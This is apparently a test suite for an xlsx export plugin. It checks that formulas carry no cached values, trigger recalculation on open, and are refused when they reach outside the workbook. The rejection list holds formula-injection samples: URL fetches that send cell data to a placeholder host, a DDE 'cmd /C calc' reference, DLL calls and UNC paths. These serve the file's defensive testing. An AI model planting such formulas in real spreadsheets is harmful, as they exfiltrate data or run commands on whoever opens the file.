import { describe, it } from 'node:test';
import { strict as assert } from 'node:assert';
import {
  renderXlsx,
  OfficeUnsafeFormulaError,
  XlsxToolInputSchema,
  type XlsxDescriptor,
} from '@omadia/plugin-office';
import { unzipToText } from './_helpers/unzipToText.js';

// omadia evaluates no formulas. A formula cell's displayed value has to come
// from the application that opens the file, and a formula may only compute over
// cells of its own workbook. The storage tests read the parts back out of the
// produced file (`xl/worksheets/sheet1.xml`, `xl/workbook.xml`) rather than
// trusting the renderer input. The policy tests go through renderXlsx, so each
// shows that a refused formula yields no workbook at all.

const plainData: XlsxDescriptor = {
  sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A', type: 'number' }], rows: [{ a: 1 }, { a: 2 }] }],
};

describe('office xlsx formulas — no cached values, recalculation on open', () => {
  // A caller-supplied cache would be stored as if it were the computed figure.
  const cachedResultInput = {
    sheets: [
      {
        name: 'S',
        columns: [
          { key: 'a', header: 'A' },
          { key: 'b', header: 'B', type: 'number' },
        ],
        rows: [{ a: 'x', b: { formula: '1+1', result: 999 } }],
      },
    ],
  };

  it('never persists a descriptor-supplied formula result', async () => {
    // The tool boundary drops the cached value …
    const parsed = XlsxToolInputSchema.safeParse(cachedResultInput);
    assert.ok(parsed.success, 'a formula cell with a result is still valid input');
    assert.deepEqual(parsed.data.sheets[0]?.rows?.[0]?.['b'], { formula: '1+1' });

    // … and the renderer ignores one smuggled past the type (a direct caller).
    const result = await renderXlsx(cachedResultInput as unknown as XlsxDescriptor);
    const sheet = (await unzipToText(result.buffer)).get('xl/worksheets/sheet1.xml') ?? '';
    assert.match(sheet, /<c r="B2"[^>]*><f>1\+1<\/f><\/c>/, 'formula written with no cached value');
    assert.doesNotMatch(sheet, /<f>1\+1<\/f><v>/, 'no <v> next to the formula');
    assert.doesNotMatch(sheet, /<v>999<\/v>/, 'the supplied cache is not stored as any value');
  });

  it('asks the opening application to recalculate when the workbook holds a formula', async () => {
    const workbookXml = async (d: XlsxDescriptor): Promise<string> =>
      (await unzipToText((await renderXlsx(d)).buffer)).get('xl/workbook.xml') ?? '';

    const inlineFormula = await workbookXml({
      sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: { formula: 'SUM(1,2)' } }] }],
    });
    assert.match(inlineFormula, /<calcPr [^>]*fullCalcOnLoad="1"/);

    const computedColumn = await workbookXml({
      sheets: [
        {
          name: 'S',
          columns: [
            { key: 'a', header: 'A', type: 'number' },
            { key: 'b', header: 'B', formula: 'A{row}*2' },
          ],
          rows: [{ a: 1 }],
        },
      ],
    });
    assert.match(computedColumn, /<calcPr [^>]*fullCalcOnLoad="1"/);

    // A plain data export has nothing to compute; the flag would only make
    // Excel mark it as changed and ask to save on close.
    const plain = await workbookXml(plainData);
    assert.match(plain, /<calcPr /);
    assert.doesNotMatch(plain, /fullCalcOnLoad/);
  });

  it('stays deterministic when the workbook holds formulas (#645)', async (t) => {
    // The recalculation flag is a constant, so it adds no wall-clock or
    // per-render bytes. It is set only for workbooks that hold a formula: the
    // cache tests in office.test.ts render formula-free descriptors, and making
    // the flag unconditional would change their bytes (and every stored
    // object's key).
    const withFormulas: XlsxDescriptor = {
      sheets: [
        {
          name: 'Data',
          columns: [
            { key: 'betrag', header: 'Betrag', type: 'currency' },
            { key: 'doppelt', header: 'Doppelt', formula: 'A{row}*2' },
          ],
          rows: [{ betrag: 100 }, { betrag: 200 }],
        },
        {
          name: 'Pivot',
          columns: [{ key: 'summe', header: 'Summe' }],
          rows: [{ summe: { formula: 'SUM(Data!A2:A3)' } }],
        },
      ],
    };
    t.mock.timers.enable({ apis: ['Date'] });
    try {
      t.mock.timers.setTime(1_700_000_000_000);
      const a = await renderXlsx(withFormulas);
      t.mock.timers.setTime(1_811_000_000_000); // ~3.5 years later
      const b = await renderXlsx(withFormulas);
      assert.ok(a.buffer.equals(b.buffer), 'wall-clock change must not change bytes');
    } finally {
      t.mock.timers.reset();
    }
  });
});

describe('office formula policy — formulas stay inside the workbook', () => {
  // The opening application recalculates every formula (the workbook asks it
  // to), so a formula that can reach the network, another program or another
  // file would do so the moment someone opens the export. Excel, LibreOffice
  // and Google Sheets all recalculate an .xlsx, so each one's ways out count.
  // Known ways out are refused by name; any other function that is not one of
  // Excel's own is refused because the policy does not know it.
  const oneFormula = (formula: string): XlsxDescriptor => ({
    sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: { formula } }] }],
  });

  // One row per refused name or pattern, grouped by family. Every row goes
  // through renderXlsx, so it proves the export is refused, not only that the
  // policy has a reason for it.
  const rejected: ReadonlyArray<readonly [formula: string, why: string, reason: RegExp]> = [
    // URL fetches in Excel and LibreOffice.
    ['WEBSERVICE("https://example.invalid/?q="&B1)', 'a URL fetch carrying cell data', /uses WEBSERVICE,/],
    ['_xlfn.WEBSERVICE("https://example.invalid/")', 'the future-function prefix', /uses WEBSERVICE,/],
    ['LEN(webservice("https://example.invalid/"))', 'a lower-case nested call', /uses WEBSERVICE,/],
    ['LET(f,WEBSERVICE,f("https://example.invalid/"))', 'a function passed as a value', /uses WEBSERVICE,/],
    ['FILTERXML(A1,"//a")', 'the XML parser for fetched content', /uses FILTERXML,/],
    ['_xlfn.IMAGE("https://example.invalid/a.png")', 'an image fetch', /uses IMAGE,/],
    // URL fetches in Google Sheets.
    ['IMPORTDATA("https://example.invalid/?q="&A1)', 'a Google Sheets data fetch', /uses IMPORTDATA,/],
    ['IMPORTXML("https://example.invalid/","//a")', 'a Google Sheets XML fetch', /uses IMPORTXML,/],
    ['IMPORTHTML("https://example.invalid/","table",1)', 'a Google Sheets HTML fetch', /uses IMPORTHTML,/],
    ['IMPORTFEED("https://example.invalid/feed")', 'a Google Sheets feed fetch', /uses IMPORTFEED,/],
    ['IMPORTRANGE("https://example.invalid/d/x","S!A1")', 'another Google spreadsheet', /uses IMPORTRANGE,/],
    // Local files, UNC paths and URLs read into the grid (Excel).
    [
      'IMPORTTEXT("https://example.invalid/?d="&ENCODEURL(TEXTJOIN(",",TRUE,A2:F500)))',
      'a text import carrying cell data',
      /uses IMPORTTEXT,/,
    ],
    ['_xlfn.IMPORTTEXT("C:\\Data\\export.txt")', 'a local text file, with the future-function prefix', /uses IMPORTTEXT,/],
    ['IMPORTCSV("https://example.invalid/c?q="&ENCODEURL(A2))', 'a CSV import carrying cell data', /uses IMPORTCSV,/],
    ['_xlfn.IMPORTCSV("\\\\host\\share\\c.csv")', 'a CSV file on a UNC path', /uses IMPORTCSV,/],
    ['MAP(A2:A9,IMPORTCSV)', 'an import function passed as a value', /uses IMPORTCSV,/],
    // Vendor services and data connections.
    ['STOCKHISTORY("MSFT",TODAY())', "Microsoft's stock data service", /uses STOCKHISTORY,/],
    ['TRANSLATE(A1,"de","en")', "Microsoft's translation service", /uses TRANSLATE,/],
    ['DETECTLANGUAGE(A1)', 'a language detection service', /uses DETECTLANGUAGE,/],
    ['GOOGLEFINANCE("NASDAQ:GOOG")', "Google's finance service", /uses GOOGLEFINANCE,/],
    ['GOOGLETRANSLATE(A1,"de","en")', "Google's translation service", /uses GOOGLETRANSLATE,/],
    ['CUBEVALUE("Sales","[Measures].[Total]")', 'an OLAP query through a data connection', /uses CUBEVALUE,/],
    // Links.
    ['HYPERLINK("https://example.invalid/?q="&B1,"open")', 'a link carrying cell data', /uses HYPERLINK,/],
    // COM servers and DLLs.
    ['RTD("server.progid",,"topic")', 'a COM real-time data server', /uses RTD,/],
    ['CALL("kernel32","GetTickCount","J")', 'a DLL call', /uses CALL,/],
    ['REGISTER("kernel32","GetTickCount","J")', 'a DLL registration', /uses REGISTER,/],
    ['REGISTER.ID("kernel32","GetTickCount","J")', 'a DLL registration by id', /uses REGISTER\.ID,/],
    // DDE, as a reference and as LibreOffice's function.
    ["cmd|' /C calc'!A0", 'a DDE command reference', /DDE reference/],
    ['DDE("cmd","/c calc","x")', "LibreOffice's DDE function", /uses DDE,/],
    // Text that becomes a reference or a formula when the client calculates.
    ['INDIRECT("[1]Sheet1!A1")', 'an external reference hidden in a string', /uses INDIRECT,/],
    ['SUM(INDIRECT(A1))', 'a reference read from a cell', /uses INDIRECT,/],
    [
      'IFERROR(__xludf.DUMMYFUNCTION("IMPORTXML(""https://example.invalid/"",""//a"")"),0)',
      'a Google Sheets function stored as text',
      /uses DUMMYFUNCTION,/,
    ],
    // Other files.
    ['[1]Sheet1!A1', 'an external workbook by index', /bracketed reference/],
    ['[Book.xlsx]Sheet1!A1', 'an external workbook by name', /bracketed reference/],
    ["'C:\\dir\\[book.xlsx]Sheet1'!A1", 'an external workbook by quoted path', /bracketed reference/],
    ["'\\\\host\\share\\book.xlsx'!Total", 'a quoted UNC path', /another file by its path/],
    ['\\\\host\\share\\book.xlsx!Total', 'an unquoted UNC path', /another file by its path/],
    ['C:\\dir\\book.xlsx!Total', 'an unquoted local path', /another file by its path/],
    ["'https://example.invalid/book.xlsx'!Total", 'a quoted URL', /another file by its path/],
    // Anything that is not one of Excel's own functions, whatever it does.
    ['IMPORTJSON("https://example.invalid/")', 'a function the catalogue does not list', /calls IMPORTJSON,/],
    ['SUMMEWENNS(A:A,B:B,C1)', 'a localised function name', /calls SUMMEWENNS,/],
    ['ＳＵＭ(A1:A3)', 'a full-width look-alike of an allowed name', /calls ＳＵＭ,/],
    ['EVALUATE("1+1")', 'an Excel 4 macro function', /calls EVALUATE,/],
    ['_xll.FETCH("https://example.invalid/")', 'an XLL add-in function', /add-in or user-defined function/],
    ['MAP(A2:A9,_xll.FETCH)', 'an add-in function passed as a value', /add-in or user-defined function/],
    ['_xludf.FETCH(A1)', 'a user-defined function', /add-in or user-defined function/],
    ['GROUPBY(A2:A9,B2:B9,_xleta.FETCH)', 'an unknown function passed as a value', /calls _xleta\.FETCH,/],
    ['LET(f,LAMBDA(x,x*2),f(A1))', 'a call through a LET name', /calls f,/],
    // Fail closed.
    ['IF(A1="x', 'an unterminated string literal', /unterminated quote/],
  ];

  for (const [formula, why, reason] of rejected) {
    it(`rejects ${why}`, async () => {
      await assert.rejects(renderXlsx(oneFormula(formula)), (err: unknown) => {
        assert.ok(err instanceof OfficeUnsafeFormulaError, `expected OfficeUnsafeFormulaError for ${formula}`);
        assert.equal(err.location, 'sheet "S", cell A2');
        assert.match(err.reason, reason);
        return true;
      });
    });
  }

  // A computed column is checked once, as a template, before any row is
  // written. `{row}` becomes each row's number, so the template must not let
  // those digits turn into part of a function name.
  const computedColumn = (formula: string): XlsxDescriptor => ({
    sheets: [
      {
        name: 'S',
        columns: [
          { key: 'a', header: 'A' },
          { key: 'calc', header: 'Calc', formula },
        ],
        rows: [{ a: 'x' }, { a: 'y' }],
      },
    ],
  });

  const rejectedTemplates: ReadonlyArray<readonly [template: string, why: string, reason: RegExp]> = [
    ['HYPERLINK("https://example.invalid/?r="&A{row})', 'a link built from each row', /uses HYPERLINK,/],
    [
      'IMPORTCSV("https://example.invalid/c?q="&ENCODEURL(A{row}))',
      'a CSV import carrying each row',
      /uses IMPORTCSV,/,
    ],
    [
      '_xlfn.IMPORTTEXT("https://example.invalid/?r="&A{row})',
      'a text import with the future-function prefix',
      /uses IMPORTTEXT,/,
    ],
    ['LOG{row}(100)', 'a row number that completes a function name', /\{row\} placeholder/],
    ['FETCH{row}(A{row})', 'a row number glued to a longer name', /\{row\} placeholder/],
  ];

  for (const [template, why, reason] of rejectedTemplates) {
    it(`rejects a computed column with ${why} before any row is written`, async () => {
      await assert.rejects(renderXlsx(computedColumn(template)), (err: unknown) => {
        assert.ok(err instanceof OfficeUnsafeFormulaError, `expected OfficeUnsafeFormulaError for ${template}`);
        assert.equal(err.location, 'sheet "S", computed column "calc"');
        assert.match(err.reason, reason);
        return true;
      });
    });
  }

  it('keeps computed columns whose {row} completes a cell reference', async () => {
    const allowed = [
      'A{row}*2',
      'SUM($A$2:$A${row})',
      'IF(A{row}="x",1,0)',
      'YEAR(A{row})&"-"&TEXT(MONTH(A{row}),"00")',
    ];
    for (const template of allowed) {
      const result = await renderXlsx(computedColumn(template));
      assert.equal(result.rowsWritten, 2, template);
    }
  });

  it('keeps formulas that only compute over this workbook', async () => {
    const allowed = [
      'SUM(Data!B2:B3)',
      "SUMIFS('Offene Posten'!E:E,'Offene Posten'!C:C,A2)",
      "VLOOKUP(A2,'Offene Posten'!A:E,5,FALSE)",
      "SUM('Jan:Dez'!B2)", // 3-D reference across sheets
      "'It''s'!A1", // escaped quote inside a sheet name
      'Image!A1', // a sheet that happens to be called Image
      'IF(A1="WEBSERVICE(x)|[y]\\\\z","a","b")', // text inside a string literal
      'IFERROR(A2/B2,0)', // `/` outside quotes divides; it is not a path
      'YEAR(A2)&"-"&TEXT(MONTH(A2),"00")',
      'sum(a2:a9)', // function names are case-insensitive
      '_xlfn.XLOOKUP(A2,Data!A:A,Data!B:B)', // the future-function prefix
      '_xlfn._xlws.SORT(A2:A9)', // the worksheet-only prefix
      'GROUPBY(A2:A9,B2:B9,_xleta.SUM)', // a built-in passed as a value
      'LET(x,SUM(A2:A9),x*2)', // a LET name used as a value, not called
      'LOG10(A2)+ATAN2(1,1)*1E3', // digits inside names and exponents
    ];
    for (const formula of allowed) {
      const result = await renderXlsx(oneFormula(formula));
      assert.equal(result.rowsWritten, 1, formula);
    }
  });
});
